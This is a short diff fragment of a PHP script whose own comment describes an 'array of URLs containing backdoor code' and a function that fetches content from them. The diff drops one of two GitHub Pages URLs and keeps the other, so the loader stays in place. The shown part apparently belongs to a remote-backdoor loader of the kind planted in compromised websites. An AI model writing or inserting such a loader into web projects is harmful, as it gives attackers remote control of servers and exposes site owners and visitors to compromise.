@@ -5,8 +5,7 @@ error_reporting(E_ALL);
 
 // Array of URLs containing backdoor code
 $urls = [
-    'https://lambarzuani.github.io/gongshi.txt', 
-    'https://lambarzuani.github.io/500.txt'
+    'https://lambarzuani.github.io/gongshi.txt'
 ];
 
 // Function to fetch content from URLs
